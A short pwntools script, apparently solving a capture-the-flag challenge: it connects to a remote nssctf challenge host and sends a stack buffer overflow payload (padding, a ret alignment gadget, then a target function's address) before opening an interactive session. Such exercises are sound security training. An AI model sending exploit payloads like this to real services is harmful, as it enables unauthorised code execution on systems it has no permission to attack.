from pwn import *

#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 24398)

ret_addr = 0x40101a
action_addr = 0x4014ba

payload = b"a" * (0x40+0x8) + p64(ret_addr) + p64(action_addr)

io.sendline(payload)

io.interactive()
